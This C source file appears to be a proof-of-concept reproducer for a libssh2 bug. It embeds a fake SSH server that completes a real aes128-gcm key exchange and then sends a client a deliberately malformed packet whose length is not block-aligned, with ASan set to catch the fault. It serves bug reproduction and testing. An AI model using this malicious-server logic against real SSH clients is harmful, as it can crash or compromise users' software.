/*
 * Drive libssh2_channel_read against a peer that negotiates
 * aes128-gcm@openssh.com and then delivers one transport packet whose
 * length is not a multiple of the cipher block.
 */
#include <arpa/inet.h>
#include <errno.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>

#include <openssl/bn.h>
#include <openssl/core_names.h>
#include <openssl/ec.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#include <libssh2.h>

static const unsigned char GROUP14_P[256] = {
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xC9, 0x0F, 0xDA, 0xA2, 0x21, 0x68, 0xC2, 0x34,
    0xC4, 0xC6, 0x62, 0x8B, 0x80, 0xDC, 0x1C, 0xD1,
    0x29, 0x02, 0x4E, 0x08, 0x8A, 0x67, 0xCC, 0x74,
    0x02, 0x0B, 0xBE, 0xA6, 0x3B, 0x13, 0x9B, 0x22,
    0x51, 0x4A, 0x08, 0x79, 0x8E, 0x34, 0x04, 0xDD,
    0xEF, 0x95, 0x19, 0xB3, 0xCD, 0x3A, 0x43, 0x1B,
    0x30, 0x2B, 0x0A, 0x6D, 0xF2, 0x5F, 0x14, 0x37,
    0x4F, 0xE1, 0x35, 0x6D, 0x6D, 0x51, 0xC2, 0x45,
    0xE4, 0x85, 0xB5, 0x76, 0x62, 0x5E, 0x7E, 0xC6,
    0xF4, 0x4C, 0x42, 0xE9, 0xA6, 0x37, 0xED, 0x6B,
    0x0B, 0xFF, 0x5C, 0xB6, 0xF4, 0x06, 0xB7, 0xED,
    0xEE, 0x38, 0x6B, 0xFB, 0x5A, 0x89, 0x9F, 0xA5,
    0xAE, 0x9F, 0x24, 0x11, 0x7C, 0x4B, 0x1F, 0xE6,
    0x49, 0x28, 0x66, 0x51, 0xEC, 0xE4, 0x5B, 0x3D,
    0xC2, 0x00, 0x7C, 0xB8, 0xA1, 0x63, 0xBF, 0x05,
    0x98, 0xDA, 0x48, 0x36, 0x1C, 0x55, 0xD3, 0x9A,
    0x69, 0x16, 0x3F, 0xA8, 0xFD, 0x24, 0xCF, 0x5F,
    0x83, 0x65, 0x5D, 0x23, 0xDC, 0xA3, 0xAD, 0x96,
    0x1C, 0x62, 0xF3, 0x56, 0x20, 0x85, 0x52, 0xBB,
    0x9E, 0xD5, 0x29, 0x07, 0x70, 0x96, 0x96, 0x6D,
    0x67, 0x0C, 0x35, 0x4E, 0x4A, 0xBC, 0x98, 0x04,
    0xF1, 0x74, 0x6C, 0x08, 0xCA, 0x18, 0x21, 0x7C,
    0x32, 0x90, 0x5E, 0x46, 0x2E, 0x36, 0xCE, 0x3B,
    0xE3, 0x9E, 0x77, 0x2C, 0x18, 0x0E, 0x86, 0x03,
    0x9B, 0x27, 0x83, 0xA2, 0xEC, 0x07, 0xA2, 0x8F,
    0xB5, 0xC5, 0x5D, 0xF0, 0x6F, 0x4C, 0x52, 0xC9,
    0xDE, 0x2B, 0xCB, 0xF6, 0x95, 0x58, 0x17, 0x18,
    0x39, 0x95, 0x49, 0x7C, 0xEA, 0x95, 0x6A, 0xE5,
    0x15, 0xD2, 0x26, 0x18, 0x98, 0xFA, 0x05, 0x10,
    0x15, 0x72, 0x8E, 0x5A, 0x8A, 0xAC, 0xAA, 0x68,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
};

static const char SERVER_BANNER[] = "SSH-2.0-pocsrv";

static int g_pktlen_field = 17;
static int g_pipe_rd = -1;
static int g_srv_fd = -1;

static void die(const char *msg)
{
    fprintf(stderr, "poc: %s (%s)\n", msg, strerror(errno));
    exit(2);
}

static void die_ssl(const char *msg)
{
    fprintf(stderr, "poc: %s\n", msg);
    exit(2);
}

static void read_full(int fd, void *buf, size_t n)
{
    unsigned char *p = buf;
    while(n) {
        ssize_t r = read(fd, p, n);
        if(r == 0)
            die("eof");
        if(r < 0) {
            if(errno == EINTR)
                continue;
            die("read");
        }
        p += r;
        n -= (size_t)r;
    }
}

static void write_full(int fd, const void *buf, size_t n)
{
    const unsigned char *p = buf;
    while(n) {
        ssize_t w = write(fd, p, n);
        if(w < 0) {
            if(errno == EINTR)
                continue;
            die("write");
        }
        p += w;
        n -= (size_t)w;
    }
}

static void put_u32(unsigned char *p, uint32_t v)
{
    p[0] = (unsigned char)(v >> 24);
    p[1] = (unsigned char)(v >> 16);
    p[2] = (unsigned char)(v >> 8);
    p[3] = (unsigned char)v;
}

static uint32_t get_u32(const unsigned char *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

static size_t mpint_encode(const BIGNUM *bn, unsigned char *out)
{
    int nbytes = BN_num_bytes(bn);
    int pad = (BN_num_bits(bn) % 8) == 0 ? 1 : 0;
    size_t body = (size_t)nbytes + (size_t)pad;
    if(out) {
        put_u32(out, (uint32_t)body);
        if(pad)
            out[4] = 0;
        BN_bn2bin(bn, out + 4 + pad);
    }
    return 4 + body;
}

static void sha256(const unsigned char *data, size_t n, unsigned char out[32])
{
    unsigned int len = 32;
    if(EVP_Digest(data, n, out, &len, EVP_sha256(), NULL) != 1)
        die_ssl("digest");
}

static void derive(const unsigned char *k_mpint, size_t k_len,
                   const unsigned char h[32], char letter,
                   unsigned char *out, size_t out_len)
{
    size_t filled = 0;
    unsigned char prev[32];
    int have_prev = 0;

    while(filled < out_len) {
        EVP_MD_CTX *md = EVP_MD_CTX_new();
        unsigned char dig[32];
        unsigned int dlen = 32;
        if(!md || EVP_DigestInit_ex(md, EVP_sha256(), NULL) != 1)
            die_ssl("derive init");
        EVP_DigestUpdate(md, k_mpint, k_len);
        EVP_DigestUpdate(md, h, 32);
        if(!have_prev) {
            unsigned char L = (unsigned char)letter;
            EVP_DigestUpdate(md, &L, 1);
            EVP_DigestUpdate(md, h, 32);
        }
        else
            EVP_DigestUpdate(md, prev, 32);
        EVP_DigestFinal_ex(md, dig, &dlen);
        EVP_MD_CTX_free(md);
        memcpy(prev, dig, 32);
        have_prev = 1;
        {
            size_t take = out_len - filled;
            if(take > 32)
                take = 32;
            memcpy(out + filled, dig, take);
            filled += take;
        }
    }
}

static EVP_PKEY *gen_p256(void)
{
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_EC, NULL);
    EVP_PKEY *pkey = NULL;
    if(!ctx || EVP_PKEY_keygen_init(ctx) <= 0 ||
       EVP_PKEY_CTX_set_ec_paramgen_curve_nid(ctx, NID_X9_62_prime256v1) <= 0 ||
       EVP_PKEY_keygen(ctx, &pkey) <= 0)
        die_ssl("p256 keygen");
    EVP_PKEY_CTX_free(ctx);
    return pkey;
}

static size_t build_hostkey(EVP_PKEY *pkey, unsigned char *out)
{
    unsigned char *point = NULL;
    size_t point_len;
    static const char type[] = "ecdsa-sha2-nistp256";
    static const char curve[] = "nistp256";
    unsigned char *p = out;

    point_len = EVP_PKEY_get1_encoded_public_key(pkey, &point);
    if(point_len == 0 || !point)
        die_ssl("encoded pubkey");

    put_u32(p, sizeof(type) - 1); p += 4;
    memcpy(p, type, sizeof(type) - 1); p += sizeof(type) - 1;
    put_u32(p, sizeof(curve) - 1); p += 4;
    memcpy(p, curve, sizeof(curve) - 1); p += sizeof(curve) - 1;
    put_u32(p, (uint32_t)point_len); p += 4;
    memcpy(p, point, point_len); p += point_len;
    OPENSSL_free(point);
    return (size_t)(p - out);
}

static size_t build_sig(EVP_PKEY *pkey, const unsigned char h[32],
                        unsigned char *out)
{
    EVP_MD_CTX *md = EVP_MD_CTX_new();
    size_t der_len = 0;
    unsigned char *der = NULL;
    const unsigned char *dp;
    ECDSA_SIG *sig;
    const BIGNUM *r, *s;
    unsigned char rbuf[40], sbuf[40];
    size_t rlen, slen, inner;
    unsigned char *p;
    static const char type[] = "ecdsa-sha2-nistp256";

    if(!md || EVP_DigestSignInit(md, NULL, EVP_sha256(), NULL, pkey) != 1)
        die_ssl("sign init");
    if(EVP_DigestSign(md, NULL, &der_len, h, 32) != 1)
        die_ssl("sign size");
    der = malloc(der_len);
    if(!der || EVP_DigestSign(md, der, &der_len, h, 32) != 1)
        die_ssl("sign");
    EVP_MD_CTX_free(md);
    dp = der;
    sig = d2i_ECDSA_SIG(NULL, &dp, (long)der_len);
    free(der);
    if(!sig)
        die_ssl("d2i sig");
    ECDSA_SIG_get0(sig, &r, &s);
    rlen = mpint_encode(r, rbuf);
    slen = mpint_encode(s, sbuf);
    ECDSA_SIG_free(sig);

    inner = rlen + slen;
    p = out;
    put_u32(p, sizeof(type) - 1); p += 4;
    memcpy(p, type, sizeof(type) - 1); p += sizeof(type) - 1;
    put_u32(p, (uint32_t)inner); p += 4;
    memcpy(p, rbuf, rlen); p += rlen;
    memcpy(p, sbuf, slen); p += slen;
    return (size_t)(p - out);
}

static void send_clear_packet(int fd, const unsigned char *payload, size_t plen)
{
    size_t packet_length = plen + 1 + 4;
    size_t padding = 8 - (packet_length % 8);
    unsigned char *pkt;
    size_t field, total;
    if(padding < 4)
        padding += 8;
    packet_length += padding;
    field = packet_length - 4;
    total = 4 + field;
    pkt = calloc(1, total);
    if(!pkt)
        die("oom");
    put_u32(pkt, (uint32_t)field);
    pkt[4] = (unsigned char)padding;
    memcpy(pkt + 5, payload, plen);
    RAND_bytes(pkt + 5 + plen, padding);
    write_full(fd, pkt, total);
    free(pkt);
}

static size_t recv_clear_packet(int fd, unsigned char *payload, size_t cap)
{
    unsigned char hdr[4];
    unsigned char *body;
    uint32_t field, pad, plen;
    read_full(fd, hdr, 4);
    field = get_u32(hdr);
    if(field < 1 || field > 65535)
        die_ssl("clear field");
    body = malloc(field);
    if(!body)
        die("oom");
    read_full(fd, body, field);
    pad = body[0];
    if(pad + 1 > field)
        die_ssl("clear pad");
    plen = field - 1 - pad;
    if(plen > cap)
        die_ssl("clear plen");
    memcpy(payload, body + 1, plen);
    free(body);
    return plen;
}

static EVP_CIPHER_CTX *gcm_init(const unsigned char *key, const unsigned char *iv,
                                int enc)
{
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char ivcopy[12];
    memcpy(ivcopy, iv, 12);
    if(!ctx || EVP_CipherInit(ctx, EVP_aes_128_gcm(), key, ivcopy, enc) != 1)
        die_ssl("cipher init");
    if(EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IV_FIXED, -1, ivcopy) != 1)
        die_ssl("iv fixed");
    return ctx;
}

static void gcm_encrypt_packet(EVP_CIPHER_CTX *ctx, const unsigned char *plain,
                               uint32_t L, int fd)
{
    unsigned char lastiv[1];
    unsigned char lenb[4];
    unsigned char *wire;
    int rc;

    wire = malloc(4 + L + 16);
    if(!wire)
        die("oom");
    put_u32(lenb, L);
    memcpy(wire, lenb, 4);
    if(EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_IV_GEN, 1, lastiv) != 1)
        die_ssl("iv gen enc");
    rc = EVP_Cipher(ctx, NULL, lenb, 4);
    if(rc < 0)
        die_ssl("aad enc");
    if(L) {
        rc = EVP_Cipher(ctx, wire + 4, plain, (int)L);
        if(rc < 0)
            die_ssl("enc");
    }
    rc = EVP_Cipher(ctx, NULL, NULL, 0);
    if(rc < 0)
        die_ssl("enc final");
    if(EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, wire + 4 + L) != 1)
        die_ssl("get tag");
    write_full(fd, wire, 4 + L + 16);
    free(wire);
}

static size_t gcm_decrypt_packet(EVP_CIPHER_CTX *ctx, unsigned char *plain,
                                 size_t cap)
{
    unsigned char lenb[4];
    unsigned char lastiv[1];
    uint32_t L;
    unsigned char *body;
    int rc;

    read_full(g_srv_fd, lenb, 4);
    L = get_u32(lenb);
    if(L > cap || L > 65535)
        die_ssl("enc field");
    body = malloc(L + 16);
    if(!body)
        die("oom");
    read_full(g_srv_fd, body, L + 16);
    if(EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_IV_GEN, 1, lastiv) != 1)
        die_ssl("iv gen dec");
    rc = EVP_Cipher(ctx, NULL, lenb, 4);
    if(rc < 0)
        die_ssl("aad dec");
    if(L) {
        rc = EVP_Cipher(ctx, plain, body, (int)L);
        if(rc < 0)
            die_ssl("dec");
    }
    if(EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, body + L) != 1)
        die_ssl("set tag");
    rc = EVP_Cipher(ctx, NULL, NULL, 0);
    free(body);
    if(rc < 0)
        die_ssl("dec final");
    return L;
}

static size_t pad16_plain(const unsigned char *payload, size_t plen,
                          unsigned char **out)
{
    size_t packet_length = plen + 1 + 4;
    size_t padding = 16 - ((packet_length - 4) % 16);
    size_t field;
    unsigned char *p;
    if(padding < 4)
        padding += 16;
    field = plen + 1 + padding;
    p = calloc(1, field);
    if(!p)
        die("oom");
    p[0] = (unsigned char)padding;
    memcpy(p + 1, payload, plen);
    RAND_bytes(p + 1 + plen, padding);
    *out = p;
    return field;
}

static void send_aligned(EVP_CIPHER_CTX *ctx, const unsigned char *payload,
                         size_t plen)
{
    unsigned char *plain = NULL;
    size_t field = pad16_plain(payload, plen, &plain);
    gcm_encrypt_packet(ctx, plain, (uint32_t)field, g_srv_fd);
    free(plain);
}

static void send_tail_packet(EVP_CIPHER_CTX *ctx)
{
    unsigned char plain[64];
    uint32_t L;

    memset(plain, 0, sizeof(plain));
    if(g_pktlen_field == 17) {
        /* padding_length || SSH_MSG_IGNORE || string(7) || 4 pad bytes */
        L = 17;
        plain[0] = 4;
        plain[1] = 2;
        put_u32(plain + 2, 7);
        memcpy(plain + 6, "abcdefg", 7);
    }
    else {
        /* Short record: padding_length || SSH_MSG_IGNORE || empty string
           does not fill a cipher block. */
        L = 8;
        plain[0] = 4;
        plain[1] = 2;
        put_u32(plain + 2, 0);
    }
    gcm_encrypt_packet(ctx, plain, L, g_srv_fd);
}

static unsigned char *namelist(unsigned char *p, const char *s)
{
    size_t n = strlen(s);
    put_u32(p, (uint32_t)n);
    memcpy(p + 4, s, n);
    return p + 4 + n;
}

static void *server_main(void *arg)
{
    int fd = *(int *)arg;
    unsigned char bannerbuf[256];
    size_t blen = 0;
    unsigned char client_kex[8192], server_kex[1024];
    size_t client_kex_len, server_kex_len;
    unsigned char client_dh[4096];
    size_t client_dh_len;
    unsigned char hostkey[256], sig[256], reply[1024];
    size_t hostkey_len, sig_len, reply_len;
    unsigned char hashbuf[16384];
    size_t hash_len = 0;
    unsigned char H[32];
    unsigned char iv_c2s[12], iv_s2c[12], key_c2s[16], key_s2c[16];
    unsigned char k_mpint[520];
    size_t k_len;
    EVP_PKEY *pkey;
    EVP_CIPHER_CTX *enc = NULL, *dec = NULL;
    BIGNUM *p = NULL, *g = NULL, *y = NULL, *f = NULL, *e = NULL, *K = NULL;
    BN_CTX *bnctx = NULL;
    unsigned char msg[8192];
    size_t mlen;
    uint32_t chan = 0;
    unsigned char one;
    const char *cbanner = LIBSSH2_SSH_DEFAULT_BANNER;

    g_srv_fd = fd;
    pkey = gen_p256();

    {
        char line[64];
        snprintf(line, sizeof(line), "%s\r\n", SERVER_BANNER);
        write_full(fd, line, strlen(line));
    }
    while(blen + 1 < sizeof(bannerbuf)) {
        read_full(fd, bannerbuf + blen, 1);
        if(bannerbuf[blen] == '\n')
            break;
        blen++;
    }
    while(blen && (bannerbuf[blen - 1] == '\r' || bannerbuf[blen - 1] == '\n'))
        blen--;
    bannerbuf[blen] = 0;

    client_kex_len = recv_clear_packet(fd, client_kex, sizeof(client_kex));
    if(client_kex_len < 1 || client_kex[0] != 20)
        die_ssl("expected kexinit");

    {
        unsigned char *s = server_kex;
        *s++ = 20;
        RAND_bytes(s, 16);
        s += 16;
        s = namelist(s, "diffie-hellman-group14-sha256");
        s = namelist(s, "ecdsa-sha2-nistp256");
        s = namelist(s, "aes128-gcm@openssh.com");
        s = namelist(s, "aes128-gcm@openssh.com");
        s = namelist(s, "hmac-sha2-256");
        s = namelist(s, "hmac-sha2-256");
        s = namelist(s, "none");
        s = namelist(s, "none");
        s = namelist(s, "");
        s = namelist(s, "");
        *s++ = 0;
        put_u32(s, 0);
        s += 4;
        server_kex_len = (size_t)(s - server_kex);
    }
    send_clear_packet(fd, server_kex, server_kex_len);

    client_dh_len = recv_clear_packet(fd, client_dh, sizeof(client_dh));
    if(client_dh_len < 5 || client_dh[0] != 30)
        die_ssl("expected dh init");

    p = BN_bin2bn(GROUP14_P, 256, NULL);
    g = BN_new();
    y = BN_new();
    f = BN_new();
    e = BN_new();
    K = BN_new();
    bnctx = BN_CTX_new();
    if(!p || !g || !y || !f || !e || !K || !bnctx)
        die_ssl("bn");
    BN_set_word(g, 2);
    if(BN_rand(y, 2047, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY) != 1)
        die_ssl("rand y");
    if(BN_mod_exp(f, g, y, p, bnctx) != 1)
        die_ssl("f");
    {
        uint32_t elen = get_u32(client_dh + 1);
        if(1 + 4 + elen > client_dh_len)
            die_ssl("e len");
        if(BN_bin2bn(client_dh + 5, (int)elen, e) == NULL)
            die_ssl("e2");
    }
    if(BN_mod_exp(K, e, y, p, bnctx) != 1)
        die_ssl("K");

    hostkey_len = build_hostkey(pkey, hostkey);

    /* exchange hash */
    {
        unsigned char *hp = hashbuf;
        size_t n;
        put_u32(hp, (uint32_t)strlen(cbanner)); hp += 4;
        memcpy(hp, cbanner, strlen(cbanner)); hp += strlen(cbanner);
        put_u32(hp, (uint32_t)strlen(SERVER_BANNER)); hp += 4;
        memcpy(hp, SERVER_BANNER, strlen(SERVER_BANNER)); hp += strlen(SERVER_BANNER);
        put_u32(hp, (uint32_t)client_kex_len); hp += 4;
        memcpy(hp, client_kex, client_kex_len); hp += client_kex_len;
        put_u32(hp, (uint32_t)server_kex_len); hp += 4;
        memcpy(hp, server_kex, server_kex_len); hp += server_kex_len;
        put_u32(hp, (uint32_t)hostkey_len); hp += 4;
        memcpy(hp, hostkey, hostkey_len); hp += hostkey_len;
        /* e mpint as it appeared in the packet (includes its length prefix) */
        n = 4 + get_u32(client_dh + 1);
        memcpy(hp, client_dh + 1, n); hp += n;
        n = mpint_encode(f, hp); hp += n;
        n = mpint_encode(K, k_mpint);
        k_len = n;
        memcpy(hp, k_mpint, n); hp += n;
        hash_len = (size_t)(hp - hashbuf);
    }
    sha256(hashbuf, hash_len, H);
    sig_len = build_sig(pkey, H, sig);

    {
        unsigned char *rp = reply;
        unsigned char fbuf[520];
        size_t flen = mpint_encode(f, fbuf);
        *rp++ = 31;
        put_u32(rp, (uint32_t)hostkey_len); rp += 4;
        memcpy(rp, hostkey, hostkey_len); rp += hostkey_len;
        memcpy(rp, fbuf, flen); rp += flen;
        put_u32(rp, (uint32_t)sig_len); rp += 4;
        memcpy(rp, sig, sig_len); rp += sig_len;
        reply_len = (size_t)(rp - reply);
    }
    send_clear_packet(fd, reply, reply_len);

    mlen = recv_clear_packet(fd, msg, sizeof(msg));
    if(mlen < 1 || msg[0] != 21)
        die_ssl("expected client newkeys");
    msg[0] = 21;
    send_clear_packet(fd, msg, 1);

    derive(k_mpint, k_len, H, 'A', iv_c2s, 12);
    derive(k_mpint, k_len, H, 'B', iv_s2c, 12);
    derive(k_mpint, k_len, H, 'C', key_c2s, 16);
    derive(k_mpint, k_len, H, 'D', key_s2c, 16);
    dec = gcm_init(key_c2s, iv_c2s, 0);
    enc = gcm_init(key_s2c, iv_s2c, 1);

    mlen = gcm_decrypt_packet(dec, msg, sizeof(msg));
    if(mlen < 1 || msg[1] != 5) {
        /* plaintext starts with padding_length */
        fprintf(stderr, "poc: service req type %u len %zu\n",
                mlen ? msg[1] : 0, mlen);
        die_ssl("service request");
    }
    {
        unsigned char acc[32];
        unsigned char *ap = acc;
        *ap++ = 6;
        put_u32(ap, 12); ap += 4;
        memcpy(ap, "ssh-userauth", 12); ap += 12;
        send_aligned(enc, acc, (size_t)(ap - acc));
    }

    mlen = gcm_decrypt_packet(dec, msg, sizeof(msg));
    if(mlen < 2 || msg[1] != 50)
        die_ssl("userauth request");
    {
        unsigned char ok = 52;
        send_aligned(enc, &ok, 1);
    }

    mlen = gcm_decrypt_packet(dec, msg, sizeof(msg));
    if(mlen < 2 || msg[1] != 90)
        die_ssl("channel open");
    /* payload: padlen, type, string type, uint32 sender */
    {
        uint32_t slen = get_u32(msg + 2);
        if(6 + slen + 4 > mlen)
            die_ssl("channel open parse");
        chan = get_u32(msg + 6 + slen);
    }
    {
        unsigned char conf[17];
        conf[0] = 91;
        put_u32(conf + 1, chan);
        put_u32(conf + 5, 0);
        put_u32(conf + 9, 32768);
        put_u32(conf + 13, 32768);
        send_aligned(enc, conf, sizeof(conf));
    }

    read_full(g_pipe_rd, &one, 1);
    send_tail_packet(enc);
    shutdown(fd, SHUT_WR);

    EVP_CIPHER_CTX_free(enc);
    EVP_CIPHER_CTX_free(dec);
    EVP_PKEY_free(pkey);
    BN_free(p); BN_free(g); BN_free(y); BN_free(f); BN_free(e); BN_free(K);
    BN_CTX_free(bnctx);
    return NULL;
}

static const char *asan_default_options(void);
const char *__asan_default_options(void)
{
    return asan_default_options();
}
static const char *asan_default_options(void)
{
    return "detect_leaks=0:abort_on_error=1";
}

int main(int argc, char **argv)
{
    int sv[2];
    int pipefd[2];
    pthread_t thr;
    LIBSSH2_SESSION *session;
    LIBSSH2_CHANNEL *channel;
    char rbuf[64];
    ssize_t n;
    int rc;

    if(argc > 1 && strcmp(argv[1], "short") == 0)
        g_pktlen_field = 8;

    if(socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0)
        die("socketpair");
    if(pipe(pipefd) != 0)
        die("pipe");
    g_pipe_rd = pipefd[0];

    if(pthread_create(&thr, NULL, server_main, &sv[0]) != 0)
        die("pthread");

    if(libssh2_init(0) != 0)
        die_ssl("libssh2_init");
    session = libssh2_session_init();
    if(!session)
        die_ssl("session");
    libssh2_session_set_blocking(session, 1);
    rc = libssh2_session_handshake(session, sv[1]);
    if(rc) {
        char *err = NULL;
        libssh2_session_last_error(session, &err, NULL, 0);
        fprintf(stderr, "handshake %d %s\n", rc, err ? err : "");
        return 2;
    }
    rc = libssh2_userauth_password(session, "user", "pass");
    if(rc) {
        char *err = NULL;
        libssh2_session_last_error(session, &err, NULL, 0);
        fprintf(stderr, "auth %d %s\n", rc, err ? err : "");
        return 2;
    }
    channel = libssh2_channel_open_session(session);
    if(!channel) {
        char *err = NULL;
        libssh2_session_last_error(session, &err, NULL, 0);
        fprintf(stderr, "channel %s\n", err ? err : "");
        return 2;
    }
    {
        unsigned char go = 1;
        write_full(pipefd[1], &go, 1);
    }
    n = libssh2_channel_read(channel, rbuf, sizeof(rbuf));
    fprintf(stderr, "channel_read -> %ld\n", (long)n);

    libssh2_channel_free(channel);
    libssh2_session_disconnect(session, "bye");
    libssh2_session_free(session);
    libssh2_exit();
    pthread_join(thr, NULL);
    close(sv[0]);
    close(sv[1]);
    close(pipefd[0]);
    close(pipefd[1]);
    return n < 0 ? 0 : 0;
}
